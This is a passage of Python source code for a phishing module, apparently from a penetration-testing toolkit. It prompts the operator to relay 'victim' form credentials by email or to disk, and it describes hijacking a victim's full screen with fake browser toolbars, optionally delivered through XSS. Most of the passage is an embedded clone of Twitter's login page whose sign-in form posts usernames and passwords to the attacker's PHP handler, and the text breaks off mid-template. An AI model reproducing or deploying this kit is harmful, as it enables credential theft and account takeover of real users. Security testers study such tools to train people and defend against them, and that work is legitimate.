                color = ''
            elif color == "magenta":
                color = ''
            elif color == "darkyellow":
                color = ''
            elif color == "yellow":
                color = ''
            elif color == "darkgreen":
                color = ''
            elif color == "green":
                color = ''
            elif color == "black":
                color = ''

        # Display User Text
        print (color + text)

   ################################################################################
   ################################################################################

    def displayPrompt(self,promptType = "Main"):
    # This Displays the command prompt and returns the data in a list
    # Depending on what command prompt you want

        try:
            if promptType == "Main":
                self.outputText('',"green") 
                try: 
                    self.inputData = raw_input("set:fsattack> ")
                except:
                    self.inputData = raw_input("set:fsattack> ")
            # FullScreen Prompt
            elif promptType == "FullScreen":
                self.outputText('',"blue") 
                try:
                    self.inputData = raw_input("set:fsattack:gen> ")
                except:
                    self.inputData = raw_input("set:fsattack:gen> ")
            elif promptType == "XSS":
                self.outputText('',"white") 
                try:
                    self.inputData = raw_input("set:fsattack:xssGen> ")
                except:
                    self.inputData = raw_input("set:fsattack:xssGen> ")
            else: 
                self.outputText('',"darkgreen")
                # When in Doubt Display Default Please
                try:
                    self.inputData = raw_input("set:pf> ")
                except:
                    self.inputData = raw_input("set:pf> ")
        except EOFError:
            pass
        # if control c skip and enter
        except KeyboardInterrupt:
            # Initiate an Exit command
            self.inputData = "99"
        try:	
            # cast to string incase its !string for split
            handOff = str(self.inputData)
            # take input and explode at space for commands and such	
            self.inputData = handOff.split(" ")
        except UnboundLocalError:
            pass
	
        # return input data
        return self.inputData

   ################################################################################
   ################################################################################

    def checkString(self,string):
    # character other then  . - a-z - A-Z - 0-9 

        # implement the filter pattern
        pattern = r'[^\.a-zA-Z0-9]'
        if re.search(pattern, string):
            # Not Alpha-Numerical
            return False
        else:
            # Only Alpha-Numerical 
            return True

   ################################################################################
   ################################################################################

    def returnPrompt(self,promptType):
    # This just returns the user to main prompt on default 
    # If we need to add extra functionality lets do it
       
     
        if promptType == "FULL_SCREEN":
            self.phishMenuFullScreen(False)
        # Return back to Main Screen
        elif promptType == "MAIN_SCREEN":
            self.phishMenuMain(False)
        # Return Back to Main XSS Menu
        elif promptType == "XSS":
            self.xssFullScreenGenerator(False)
        else:
            # Return to Main Prompt
            self.phishMenuMain(False)

   ################################################################################
   ################################################################################

    def errorOutput(self,errMsg,colorMsg,promptType = "FULL_SCREEN"):
    # This Handles all the Errors in the Module
    # If you want to log them also you can add that here :D
       
        # Throw Error
        self.outputText(errMsg,colorMsg)
        # Return to Prompt
        self.returnPrompt(promptType)


   ################################################################################
   ################################################################################

    def phpEnabled(self):
    # Checks if PHP is Enabled and should we use it for added functionality

        phpList = []
        # PHP Must be Enabled lets check   
        self.results = raw_input("\nIs PHP Enabled on your WebServer? ( y OR n ): ")      
        if self.results.lower()[0] == "y" or self.results.lower() == "yes":
            phpList.append("YES_PHP")  
        elif self.results[0].lower() == "n" or self.results.lower() == "no":
            self.phpInstalled = """\n
            [*]  PHP Must be Installed on the Server for 
                 Added Functionality to the actual Attack Vector 
                 itself. Not to mention giving us a communication channel 
                 to relay important information. 
               ( Such As the Pen Test Victims Information ) 
            """
            self.outputText(self.phpInstalled,"white")
            self.errorOutput("\t[!] Error - PHP Must be Installed And Available ","yellow")
        else:
            self.errorOutput("[!] Error - Please Enter Yes or No ","yellow")

        return phpList

   ################################################################################
   ################################################################################


     
  ############################################################################################################

    def getRelayFullScreenInformation(self,phpEnabled = "YES_PHP"):   
    # Sort out how we are gonna store phished results 

        storageList = []
        # Mail or Disk ask user
        self.results = raw_input("\nHow Should We Relay Victim Web Form Information? ( [m]ail,[d]isk ) : ")
        if self.results.lower()[0] == "m" or self.results.lower() == "mail":
            self.outputText("\n[!] Warning - Sendmail Should be Configured and Working with PHP For This to Work\n","yellow")
            storageList.append("MAIL")
            self.results = raw_input("\nPlease Enter an Email Address For Form Credentials to Get Sent Too: ")
            # If we can split by @ its ok not a serious check not a reason for one if there stupid its there fault..
            if self.results.split("@") and len(self.results) > 5:
                storageList.append(self.results)
            else:
                # Throw Error improper email no @
                self.errorOutput("[!] Error Please Enter a Correct Email Address","yellow")
        elif self.results.lower()[0] == "d" or self.results.lower() == "disk":
            # We need PHP to store the file on server
            if phpEnabled == "NO_PHP":
                self.errorOutput("[!] Error - We Can't Write the File to the Servers Disk Without PHP Enabled","yellow")
            else:
                storageList.append("DISK")
                # Ask if they want a Random File name created
                self.results = raw_input("\nWould you like a Random file name Created for each Submission? ([y]es or [n]o) : ")
                if self.results.lower()[0] == "y" or self.results.lower() == "yes":
                    storageList.append("RANDOM_FILE")
                else:
                    self.results = raw_input("\nSpecify a File Name for the saved Intel? ( Ex: f00d ) : ")
                    # Check if string is AlphaNumerical
                    if  self.checkString(self.results) == False:
                        self.errorOutput("[!] Error - Invalid File Name Specified! AlphaNumerical + Periods Only! ","yellow")
                    else:
                        storageList.append(self.results)
        else:
            self.errorOutput("[!] Error - Please Specify either [m]ail or [d]isk ! ","yellow")


        # Return List for use
        return storageList

   ################################################################################
   ################################################################################

    def xssPayloadGenerator(self):
    # Very Simple XSS Payload Generator 
    # TODO: Complete This Function

        bannerDisplay = """\n\n
            [*] Under development!

            """
        self.outputText(bannerDisplay,"yellow")
        self.phishMenuMain(False)


   ################################################################################
   ################################################################################

    def exitFullScreenPhish(self):
    # Add The Return SET Menu Here

        # Grab Application Name
        appName = sys.argv[0]

        # linux or mac/unixIsh close out
        if self.determineOperatingSystem() == "posix":
            # close linux unix processes
            self.closeLinuxUnixProcesses(appName)

        # Winblows Check	        
        elif self.determineOperatingSystem() == "windows":
            # close windows processes
            self.closeWindowsProcesses(appName)

        # No POSIX System or Windows Fail Silently and Exit 
        else:
            pass

        # Display Exit Banner for User
        self.fullScreenExitBanner = """\n
        [!] Closing any Processes Open By Module
        [!] Returning Back to Web Attacks Menu\n
        """
        self.outputText(self.fullScreenExitBanner,"cyan")

        # Exit Success  TODO: EDIT THIS TO CALL SET MENU
        # THIS SHOULD RETURN BACK TO WEB ATTACK MENU HERE 
        #exit(0)
        return True

   ################################################################################
   ################################################################################

    def closeWindowsProcesses(self,appName):
    # This kills all windows processes running braH 

        # kill process
        try:
            handle = subprocess.Popen(appName, shell=False)
            subprocess.Popen("taskkill /F /T /PID %i"%handle.pid , shell=True) 
        except (ValueError, OSError):
            pass

   ################################################################################
   ################################################################################

    def closeLinuxUnixProcesses(self,appName):
    # close out all processes in linux n unix machines

        p = subprocess.Popen(['ps', '-A'], stdout=subprocess.PIPE)
        out, err = p.communicate()
        for line in out.splitlines():
            if appName in line:
                try:
                    pid = int(line.split(None, 1)[0])
                    os.kill(pid, signal.SIGKILL)
                except OSError:
                    pass

   ################################################################################
   ################################################################################

    def determineOperatingSystem(self):
    # return the operating system to user 

        # assign the variables 
        operating_system = self.checkOs()
        # Returns operating system
        return operating_system


   ################################################################################
   ################################################################################

    def checkOs(self):
    #actually does the grunt work returns the operating system 

	 # This function only looks for Mac,Linux or Windows
	 # check if its apple user
        if sys.platform == "darwin":
            operating_system = "posix"
        # Check for Windows
        elif os.name == "nt":
            operating_system = "windows"
        # Check for Linux
        elif os.name == "posix":
            operating_system = "posix"
        else:
            operating_system = "windows"
        # Return our operating system
        return operating_system

   ################################################################################
   ################################################################################


    def displayAboutFullScreen(self):
    # This just displays a description about the attacks 


        self.aboutFullScreenTop = """
      \n\t[?] About - FullScreen API Generator Attack \n 
        -----------------------------------------------------------"""
        self.aboutFullScreenBottom = """
      =   Once Deployed the Customized files are 
      =   placed in the selected Web Servers 
      =   WWW Directory. Browse to the files by 
      =   visiting localhost/index.html or localhost/index.php.
      =   Index being the name of the main file. The index 
      =   file can be re-named to prevent file name conflicts.
      =   Once the Victim goes to the website they are then 
      =   dupped into clicking a Spoofed Link That shows 
      =   the Actual Website But when clicked does not goto it. 
      =   This attack also works great by placing the site and 
      =   link and deploying it using an XSS vector of attack.
      =   As long as Javascript can be Displayed in the XSS Vuln.
      =   and maybe other factors.. After clicking on the Spoofed link 
      =   the Victims Full-Screen is then completely taken over 
      =   and replaced with Fake Browser / Operating System 
      =   Toolbars & Menu images. You can pick from four preconfigured
      =   FullScreen templates. PHP will
      =   return the information, Along with also grabbing a ton
      =   of other very interesting facts about the user.
       """
        self.aboutFullScreenFooter = """	
      [?]  Compatible:    

      =       This Attack Works With - FireFox , Chrome, 
      =    Safari 6 (on OS X 10.8 Mountain Lion).
      =    Supported Images for Operating Systems: 
      =    Windows Linux & Mac
      =
      =   It Automatically Detects What Browser/OS 
      =   the victim is using and Deploys the Proper Images.
      =   It Also Requires PHP Installed on the Web Server
      =   Running the Files for Proper File Relaying.
      =   *ATTENTION*  If Sendmail is not properly configured stick to 
      =   writing the information to disk.
        """

        self.outputText(self.aboutFullScreenTop,"white")
        self.outputText(self.aboutFullScreenBottom,"darkyellow")
        self.outputText(self.aboutFullScreenFooter,"yellow")

        # Display Prompt Again
        self.phishMenuFullScreen(False)

   ################################################################################
   ################################################################################

    def openFile(self,fileInput,fileType):
    # This method only opens and returns a file
    # for you to do the manipulation and use the data from the file
        
	# check if the file is present	
        if os.path.exists(fileInput):

            if fileType == "text":
		
                try:
	            # open the file for return
                    openFile = open(fileInput,'r+')
                except IOError:
                    #Throw Errr Couldnt Open
                    return "ERR_FILE_OPEN"
		
            if fileType == "bin":
  
                try:
	            # open the file for return
                    openFile= open(fileInput,'r+b')
                except IOError:
                    #Throw Errr Couldnt Open
                    return "ERR_FILE_OPEN"
	     # return the file	
            return openFile
        else:
            # No file found to open throw error		
            return "NO_FILE_FOUND"
	
   ################################################################################
   ################################################################################
 
    def saveFile(self,fileInput,fileData,fileType):
    # This saves the file creates one and saves it not exists or appends if it does 

        if fileType == "text":
            try:
                if os.path.isfile(fileInput):
	             # save the file append because it already exists
                    openFile = open(fileInput,'a+')
                    # write file 
                    for s in (str(item[0]) for item in fileData):
                        openFile.write(s+'\n')
                else:
                    # Write file it doesnt exist yet from what we can tell
                    openFile = open(fileInput,'w+')
                    # write file 
                    for s in (str(item[0]) for item in fileData):
                        openFile.write(s+'\n')
	         # close
                openFile.close()

            except IOError:
                 #Throw Errr Couldnt Open
                 return "ERR_FILE_OPEN"
		
        if fileType == "bin":
            try:
                if os.path.isfile(fileInput):
	             # save the file append because it already exists
                    openFile = open(fileInput,'a+b')
                    # write file 
                    for s in (str(item[0]) for item in fileData):
                        openFile.write(s+'\n')
                else:
                    # Write file it doesnt exist yet from what we can tell
                    openFile = open(fileInput,'w+b')
                    # write file 
                    for s in (str(item[0]) for item in fileData):
                        openFile.write(s+'\n')
	         # close
                openFile.close()

            except IOError:
                 #Throw Errr Couldnt Open
                 return "ERR_FILE_OPEN"
		
	 # return TRUE  file_written
        return "FILE_WRITTEN"

   ################################################################################
   ################################################################################

    def fullscreenFileHTML(self,pathList,imgPath,valueList,title,codeType):
    # This Holds All the HTML for the Fullscreen Attack Files [ fullscreen generation  only ]
    # This is a long function lol could be split into another file but i wanted to keep
    # everything in one file just for ease of portability at first.         

        # twitter HTML for twitter fullscreen site
        if codeType == "TWITTER":
            indexList = []
            indexCode = """
<!doctype html>
<html class="no-js" lang="en">
<head>
<meta charset="utf-8">
<meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
<title>"""+title+"""</title>
<meta name="description" content="">
<link rel="stylesheet" href="css/style.css">
</head>
<body>
  
   <a class=\"spoofLink\" href=\""""+pathList[0]+"""\">"""+pathList[1]+"""</a>

  <div id="spoofHeader">
    <div id="spoofMenu"></div>
    <div id="spoofBrowser"></div>
  </div>


<div id="spoofSite">

<!DOCTYPE html>
<!--[if IE 8]><html class="lt-ie10 ie8" lang="en"><![endif]-->
<!--[if IE 9]><html class="lt-ie10 ie9" lang="en"><![endif]-->
<!--[if gt IE 9]><!--><html lang="en"><!--<![endif]-->
  <head>

    
    <meta charset="utf-8">
    <meta name="description" content="Sign in to Twitter. Welcome back!">
    
    <meta name="msapplication-TileImage" content="//abs.twimg.com/favicons/win8-tile-144.png"/>
    <meta name="msapplication-TileColor" content="#00aced"/>
    
      <link href="http://abs.twimg.com/favicons/favicon.ico" rel="shortcut icon" type="image/x-icon">
    
        <meta name="viewport" id="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0">
    
      <meta name="swift-page-name" id="swift-page-name" content="login">
    
        <link rel="canonical" href="https://twitter.com/login/error">
    
    
    
    <link rel="search" type="application/opensearchdescription+xml" href="/opensearch.xml" title="Twitter">
    
    

          <link rel="stylesheet" href="https://abs.twimg.com/a/1383847355/t1/css/t1_core_logged_out.bundle.css" type="text/css">
    
        <link rel="stylesheet" href="https://abs.twimg.com/a/1383847355/t1/css/t1_more.bundle.css" type="text/css">
      </head>
  <body class="t1 logged-out" 
data-fouc-class-names="swift-loading"
 dir="ltr">
      <script id="swift_loading_indicator">
        document.body.className=document.body.className+" "+document.body.getAttribute("data-fouc-class-names");
      </script>
    <div id="doc" class="route-login">
        <div class="topbar js-topbar">
          <div id="banners" class="js-banners">
          </div>
          <div class="global-nav" data-section-term="top_nav">
            <div class="global-nav-inner">
              <div class="container">
        
                
                 <ul class="nav js-global-actions"><li class="home" data-global-action="t1home">  <a class="nav-logo-link" href="/" data-nav="front"> <span class="icon bird-topbar-blue"><span class="visuallyhidden">Twitter</span></span> </a>   </li> </ul>  <div class="pull-right"> <div role="search">
  <form class="form-search js-search-form" action="/search" id="global-nav-search">
    <label class="visuallyhidden" for="search-query">Search query</label>
    <input class="search-input" type="text" id="search-query" placeholder="Search" name="q" autocomplete="off" spellcheck="false">
    <span class="search-icon js-search-action">
      <button type="submit" class="icon nav-search">
        <span class="visuallyhidden">
          
          Search
        </span>
      </button>
    </span>
    <input disabled="disabled" class="search-input search-hinting-input" type="text" id="search-query-hint" autocomplete="off" spellcheck="false">
      <div role="menu" aria-hidden="true" class="dropdown-menu typeahead ">
        <div aria-hidden="true" class="dropdown-caret">
          <div class="caret-outer"></div>
          <div class="caret-inner"></div>
        </div>
        <div role="presentation" class="dropdown-inner js-typeahead-results">
          <div role="presentation" class="typeahead-saved-searches">
      <ul role="presentation" class="typeahead-items saved-searches-list">
        
        <li role="presentation" class="typeahead-item typeahead-saved-search-item">
          <span class="icon close" aria-hidden="true"><span class="visuallyhidden">Remove</span></span>
          <a role="menuitem" aria-describedby="saved-searches-heading" class="js-nav" href="" data-search-query="" data-query-source="" data-ds="saved_search" tabindex="-1"><span class="icon generic-search"></span></a>
        </li>
      </ul>
    </div>
    <ul role="presentation" class="typeahead-items typeahead-topics">
      
      <li role="presentation" class="typeahead-item typeahead-topic-item">
        <a role="menuitem" class="js-nav" href="" data-search-query="" data-query-source="typeahead_click" data-ds="topics" tabindex="-1">
          <span class="icon generic-search"></span>
        </a>
      </li>
    </ul>
    
    <ul role="presentation" class="typeahead-items typeahead-accounts social-context js-typeahead-accounts">
      
      <li role="presentation" data-user-id="" data-user-screenname="" data-remote="true" data-score="" class="typeahead-item typeahead-account-item js-selectable">
        
        <a role="menuitem" class="js-nav" data-query-source="typeahead_click" data-search-query="" data-ds="account">
          <img class="avatar size32" alt="">
          <span class="typeahead-user-item-info">
            <span class="fullname"></span>
            <span class="js-verified hidden"><span class="icon verified"><span class="visuallyhidden">Verified account</span></span></span>
            <span class="username"><s>@</s><b></b></span>
          </span>
          <span class="typeahead-social-context"></span>
        </a>
      </li>
      <li role="presentation" class="js-selectable typeahead-accounts-shortcut js-shortcut"><a role="menuitem" class="js-nav" href="" data-search-query="" data-query-source="typeahead_click" data-shortcut="true" data-ds="account_search"></a></li>
    </ul>
    <ul role="presentation" class="typeahead-items typeahead-trend-locations-list">
      
      <li role="presenation" class="typeahead-item typeahead-trend-locations-item"><a role="menuitem" class="js-nav" href="" data-ds="trend_location" data-search-query="" tabindex="-1"></a></li>
    </ul>    <ul role="presentation" class="typeahead-items typeahead-context-list">
      
      <li role="presentation" class="typeahead-item typeahead-context-item"><a role="menuitem" class="js-nav" href="" data-ds="context_helper" data-search-query="" tabindex="-1"></a></li>
    </ul>  </div>
      </div>
  </form>
</div> <ul class="nav secondary-nav language-dropdown"> <li class="dropdown js-language-dropdown"> <a href="#supported_languages" class="dropdown-toggle js-dropdown-toggle"> <small>Language:</small> <span class="js-current-language">English</span> <b class="caret"></b> </a> <div class="dropdown-menu"> <div class="dropdown-caret right"> <span class="caret-outer"> </span> <span class="caret-inner"></span> </div> <ul id="supported_languages">  <li><a href="?lang=id" data-lang-code="id" title="Indonesian" class="js-language-link js-tooltip">Bahasa Indonesia</a></li>  <li><a href="?lang=msa" data-lang-code="msa" title="Malay" class="js-language-link js-tooltip">Bahasa Melayu</a></li>  <li><a href="?lang=da" data-lang-code="da" title="Danish" class="js-language-link js-tooltip">Dansk</a></li>  <li><a href="?lang=de" data-lang-code="de" title="German" class="js-language-link js-tooltip">Deutsch</a></li>  <li><a href="?lang=en-gb" data-lang-code="en-gb" title="English UK" class="js-language-link js-tooltip">EnglishUK</a></li>  <li><a href="?lang=es" data-lang-code="es" title="Spanish" class="js-language-link js-tooltip">Español</a></li>  <li><a href="?lang=eu" data-lang-code="eu" title="Basque" class="js-language-link js-tooltip">Euskara</a></li>  <li><a href="?lang=fil" data-lang-code="fil" title="Filipino" class="js-language-link js-tooltip">Filipino</a></li>  <li><a href="?lang=gl" data-lang-code="gl" title="Galician" class="js-language-link js-tooltip">Galego</a></li>  <li><a href="?lang=it" data-lang-code="it" title="Italian" class="js-language-link js-tooltip">Italiano</a></li>  <li><a href="?lang=xx-lc" data-lang-code="xx-lc" title="Lolcat" class="js-language-link js-tooltip">LOLCATZ</a></li>  <li><a href="?lang=hu" data-lang-code="hu" title="Hungarian" class="js-language-link js-tooltip">Magyar</a></li>  <li><a href="?lang=nl" data-lang-code="nl" title="Dutch" class="js-language-link js-tooltip">Nederlands</a></li>  <li><a href="?lang=no" data-lang-code="no" title="Norwegian" class="js-language-link js-tooltip">Norsk</a></li>  <li><a href="?lang=pl" data-lang-code="pl" title="Polish" class="js-language-link js-tooltip">Polski</a></li>  <li><a href="?lang=pt" data-lang-code="pt" title="Portuguese" class="js-language-link js-tooltip">Português</a></li>  <li><a href="?lang=fi" data-lang-code="fi" title="Finnish" class="js-language-link js-tooltip">Suomi</a></li>  <li><a href="?lang=sv" data-lang-code="sv" title="Swedish" class="js-language-link js-tooltip">Svenska</a></li>  <li><a href="?lang=tr" data-lang-code="tr" title="Turkish" class="js-language-link js-tooltip">Türkçe</a></li>  <li><a href="?lang=ca" data-lang-code="ca" title="Catalan" class="js-language-link js-tooltip">català</a></li>  <li><a href="?lang=fr" data-lang-code="fr" title="French" class="js-language-link js-tooltip">français</a></li>  <li><a href="?lang=ro" data-lang-code="ro" title="Romanian" class="js-language-link js-tooltip">română</a></li>  <li><a href="?lang=cs" data-lang-code="cs" title="Czech" class="js-language-link js-tooltip">Čeština</a></li>  <li><a href="?lang=el" data-lang-code="el" title="Greek" class="js-language-link js-tooltip">Ελληνικά</a></li>  <li><a href="?lang=ru" data-lang-code="ru" title="Russian" class="js-language-link js-tooltip">Русский</a></li>  <li><a href="?lang=uk" data-lang-code="uk" title="Ukrainian" class="js-language-link js-tooltip">Українська мова</a></li>  <li><a href="?lang=he" data-lang-code="he" title="Hebrew" class="js-language-link js-tooltip">עִבְרִית</a></li>  <li><a href="?lang=ur" data-lang-code="ur" title="Urdu" class="js-language-link js-tooltip">اردو</a></li>  <li><a href="?lang=ar" data-lang-code="ar" title="Arabic" class="js-language-link js-tooltip">العربية</a></li>  <li><a href="?lang=fa" data-lang-code="fa" title="Farsi" class="js-language-link js-tooltip">فارسی</a></li>  <li><a href="?lang=hi" data-lang-code="hi" title="Hindi" class="js-language-link js-tooltip">हिन्दी</a></li>  <li><a href="?lang=th" data-lang-code="th" title="Thai" class="js-language-link js-tooltip">ภาษาไทย</a></li>  <li><a href="?lang=ja" data-lang-code="ja" title="Japanese" class="js-language-link js-tooltip">日本語</a></li>  <li><a href="?lang=zh-cn" data-lang-code="zh-cn" title="Simplified Chinese" class="js-language-link js-tooltip">简体中文</a></li>  <li><a href="?lang=zh-tw" data-lang-code="zh-tw" title="Traditional Chinese" class="js-language-link js-tooltip">繁體中文</a></li>  <li><a href="?lang=ko" data-lang-code="ko" title="Korean" class="js-language-link js-tooltip">한국어</a></li>  </ul> </div> <div class="js-front-language"> <form action="/sessions/change_locale" class="language" method="POST"> <input type="hidden" name="lang"> <input type="hidden" name="redirect"> <input type="hidden" name="authenticity_token" value="d6b7bcb9949f04c0b74b17dbcf331ab83e5e5d58"> </form> </div> </li> </ul>  <ul class="nav secondary-nav session-dropdown" id="session"> <li class="dropdown js-session"> <a href="/login" class="dropdown-toggle js-dropdown-toggle dropdown-signin" id="signin-link" data-nav="login"> <small>Have an account?</small> Sign in<span class="caret"></span> </a> <a href="https://twitter.com/signup?context=login" class="dropdown-signup" id="signup-link" data-nav="signup"> <small>New to Twitter?</small><span class="emphasize"> Join Today &raquo;</span> </a> <div class="dropdown-menu dropdown-form" id="signin-dropdown"> <div class="dropdown-caret right"> <span class="caret-outer"></span> <span class="caret-inner"></span> </div> <div class="signin-dialog-body">

 <form action="<?php echo $_SERVER['PHP_SELF']; ?>" class="js-signin signin" method="post">
  <fieldset>
    <legend id="signin-form-legend" class="visuallyhidden">Sign In</legend>
    <fieldset class="textbox">
      <label class="username js-username">
        <span>Username or email</span>
        <input class="js-username-field email-input js-initial-focus" type="text" name="Username" autocomplete="on">
      </label>
      <label class="password js-password">
        <span>Password</span>
        <input class="js-password-field" type="password" value="" name="Password">
      </label>
    </fieldset>
    <fieldset class="subchck">
      <button type="submit" class="btn submit">Sign in</button>
      <label class="remember">
        <input type="checkbox" value="1" name="remember_me" checked="checked">
        <span>Remember me</span>
      </label>
    </fieldset>
    
    <input type="hidden" name="scribe_log">
    <input type="hidden" name="redirect_after_login" value="/">
    <input type="hidden" value="d6b7bcb9949f04c0b74b17dbcf331ab83e5e5d58" name="authenticity_token"/>
  </fieldset>
  <div class="divider"></div>
  <p class="footer-links">
    
    <a class="forgot" href="/account/resend_password">Forgot password?</a><br />
    <a class="mobile has-sms" href="/account/complete">Already using Twitter via text message?</a>
  </p>
</form>
 </div> </div> </li> </ul> </div> 
        
                
                <button type="button" id="close-all-button" class="close-all-tweets js-close-all-tweets js-tooltip" title="Close all open Tweets">
                  <span class="icon nav-breaker"><span class="visuallyhidden">Close all open Tweets</span></button>
                </button>
              </div>
            </div>
          </div>
        
        </div>
        <div id="page-outer">
          <div id="page-container" class="wrapper wrapper-login white">
            <div class="page-canvas">

  <div class="signin-wrapper" data-login-message="false">
    <h1>Sign in to Twitter</h1>
    <form action="https://twitter.com/sessions" class="clearfix signin js-signin" method="post">
      <fieldset>
      
        <div class="clearfix holding hasome">
          <span class="username js-username holder">Username or email</span>
          <input class="js-username-field email-input js-initial-focus" type="text" name="session[username_or_email]" autocomplete="on" value="">
        </div>
      
        <div class="clearfix holding">
          <span class="password holder">Password</span>
          <input class="js-password-field" type="password" name="session[password]">
        </div>
      
        <input type="hidden" value="d6b7bcb9949f04c0b74b17dbcf331ab83e5e5d58" name="authenticity_token"/>
      
      </fieldset>
      <div class="captcha js-captcha">
      </div>
      <div class="clearfix">
      
        <input type="hidden" name="scribe_log">
        <input type="hidden" name="redirect_after_login" value="/">
        <input type="hidden" value="d6b7bcb9949f04c0b74b17dbcf331ab83e5e5d58" name="authenticity_token"/>
        <button type="submit" class="submit btn primary-btn">Sign in</button>
      
        <fieldset class="subchck">
          <label class="remember">
            <input type="checkbox" value="1" name="remember_me" checked="checked">
            Remember me
          </label>
        </fieldset>
        <span class="separator">·</span>
        <a class="forgot" href="/account/resend_password">Forgot password?</a>
      
      </div>
    </form>
  </div>

  <div class="clearfix mobile has-sms">
    <p class="signup-helper">
      New to Twitter?
      <a id="login-signup-link" href="https://twitter.com/signup">Sign up now&#32;&raquo;</a>
    </p>
    <p>
      Already using Twitter via text message?
      <a href="/account/complete">Activate your account&#32;&raquo;</a>
    </p>
  </div>

</div>

          </div>
        </div>
          </div>
    <div class="alert-messages " id="message-drawer">
        <div class="message ">
      <div class="message-inside">
        <span class="message-text">Wrong Username/Email and password combination.</span>
            <a class="dismiss" href="#">&times;</a>
      </div>
    </div></div>
    <div class="gallery-overlay"></div>
<div class="gallery-container">
  <div class="gallery-close-target"></div>
  <div class="swift-media-gallery">
    <div class="modal-header">
      <button type="button" class="modal-btn modal-close js-close">
            <span class="icon close-medium">
              <span class="visuallyhidden">Close</span>
            </span>
      </button>
      <a class="gridview grid-action" href="#">
          <span class="icon grid-icon">
            <span class="visuallyhidden"></span>
          </span>
      </a>
      <h2 class="modal-title"></h2>
    </div>
    <div class="gallery-media"></div>
    <div class="gallery-nav nav-prev">
      <span class="nav-prev-handle"></span>
    </div>
    <div class="gallery-nav nav-next">
      <span class="nav-next-handle"></span>
    </div>
    <div class="tweet-inverted gallery-tweet"></div>
  </div>
</div>

    
    <div class="modal-overlay"></div>
    
    
    
    
    <div id="goto-user-dialog" class="modal-container">
  <div class="modal modal-small draggable">
    <div class="modal-content">
      <button type="button" class="modal-btn modal-close js-close">
            <span class="icon close-medium">
              <span class="visuallyhidden">Close</span>
            </span>
      </button>

      <div class="modal-header">
        <h3 class="modal-title">Go to a person's profile</h3>
      </div>

      <div class="modal-body">
        <div class="modal-inner">
          <form class="goto-user-form">
            <input class="input-block username-input" type="text" placeholder="Start typing a name to jump to a profile">
            
            
            
            <div role="menu" aria-hidden="true" class="dropdown-menu typeahead ">
              <div aria-hidden="true" class="dropdown-caret">
                <div class="caret-outer"></div>
                <div class="caret-inner"></div>
              </div>
              <div role="presentation" class="dropdown-inner js-typeahead-results">
                <div role="presentation" class="typeahead-saved-searches">
      <ul role="presentation" class="typeahead-items saved-searches-list">
        
        <li role="presentation" class="typeahead-item typeahead-saved-search-item">
          <span class="icon close" aria-hidden="true"><span class="visuallyhidden">Remove</span></span>
          <a role="menuitem" aria-describedby="saved-searches-heading" class="js-nav" href="" data-search-query="" data-query-source="" data-ds="saved_search" tabindex="-1"><span class="icon generic-search"></span></a>
        </li>
      </ul>
    </div>
    <ul role="presentation" class="typeahead-items typeahead-topics">
      
      <li role="presentation" class="typeahead-item typeahead-topic-item">
        <a role="menuitem" class="js-nav" href="" data-search-query="" data-query-source="typeahead_click" data-ds="topics" tabindex="-1">
          <span class="icon generic-search"></span>
        </a>
      </li>
    </ul>
    
    
    
    
    <ul role="presentation" class="typeahead-items typeahead-accounts js-typeahead-accounts">
      
      <li role="presentation" data-user-id="" data-user-screenname="" data-remote="true" data-score="" class="typeahead-item typeahead-account-item js-selectable">
        
        <a role="menuitem" class="js-nav" data-query-source="typeahead_click" data-search-query="" data-ds="account">
          <img class="avatar size24" alt="">
          <span class="typeahead-user-item-info">
            <span class="fullname"></span>
            <span class="js-verified hidden"><span class="icon verified"><span class="visuallyhidden">Verified account</span></span></span>
            <span class="username"><s>@</s><b></b></span>
          </span>
        </a>
      </li>
      <li role="presentation" class="js-selectable typeahead-accounts-shortcut js-shortcut"><a role="menuitem" class="js-nav" href="" data-search-query="" data-query-source="typeahead_click" data-shortcut="true" data-ds="account_search"></a></li>
    </ul>
    <ul role="presentation" class="typeahead-items typeahead-trend-locations-list">
      
      <li role="presenation" class="typeahead-item typeahead-trend-locations-item"><a role="menuitem" class="js-nav" href="" data-ds="trend_location" data-search-query="" tabindex="-1"></a></li>
    </ul>    <ul role="presentation" class="typeahead-items typeahead-context-list">
      
      <li role="presentation" class="typeahead-item typeahead-context-item"><a role="menuitem" class="js-nav" href="" data-ds="context_helper" data-search-query="" tabindex="-1"></a></li>
    </ul>  </div>
            </div>
          </form>
        </div>
      </div>

    </div>
  </div>
</div>

      <div id="retweet-tweet-dialog" class="modal-container">
    <div class="close-modal-background-target"></div>
    <div class="modal draggable">
      <div class="modal-content">
        <button type="button" class="modal-btn modal-close js-close">
            <span class="icon close-medium">
              <span class="visuallyhidden">Close</span>
            </span>
      </button>

        <div class="modal-header">
          <h3 class="modal-title">Retweet this to your followers?</h3>
        </div>
  
        <div class="modal-body modal-tweet"></div>
  
        <div class="modal-footer">
          <button class="btn cancel-action js-close">Cancel</button>
          <button class="btn primary-btn retweet-action">Retweet</button>
        </div>
      </div>
    </div>
  </div>  <div id="delete-tweet-dialog" class="modal-container">
    <div class="close-modal-background-target"></div>
    <div class="modal draggable">
      <div class="modal-content">
        <button type="button" class="modal-btn modal-close js-close">
            <span class="icon close-medium">
              <span class="visuallyhidden">Close</span>
            </span>
      </button>

        <div class="modal-header">
          <h3 class="modal-title">Are you sure you want to delete this Tweet?</h3>
        </div>
  
        <div class="modal-body modal-tweet"></div>
  
        <div class="modal-footer">
          <button class="btn cancel-action js-close">Cancel</button>
          <button class="btn primary-btn delete-action">Delete</button>
        </div>
      </div>
    </div>
  </div>

    
<div id="keyboard-shortcut-dialog" class="modal-container">
  <div class="close-modal-background-target"></div>
  <div class="modal modal-large draggable">
    <div class="modal-content">
      <button type="button" class="modal-btn modal-close js-close">
            <span class="icon close-medium">
              <span class="visuallyhidden">Close</span>
            </span>
      </button>

      
      <div class="modal-header">
        <h3 class="modal-title">Keyboard shortcuts</h3>
      </div>

      
      <div class="modal-body">

        <div class="keyboard-shortcuts clearfix" id="keyboard-shortcut-menu">
          <p class="visuallyhidden">
            Note: To use these shortcuts, users of screen readers may need to toggle off the virtual navigation.
          </p>
          <table class="modal-table">
            <tbody>
              <tr>
                <td class="shortcut">
                  <b class="sc-key">Enter</b>
                </td>
                <td class="shortcut-label">Open Tweet details</td>
              </tr>
              <tr>
                <td class="shortcut">
                  <b class="sc-key">g</b> <b class="sc-key">f</b>
                </td>
                <td class="shortcut-label">Go to user...</td>
              </tr>
              <tr>
                <td class="shortcut">
                  <b class="sc-key">?</b>
                </td>
                <td class="shortcut-label">This menu</td>
              </tr>
              <tr>
                <td class="shortcut">
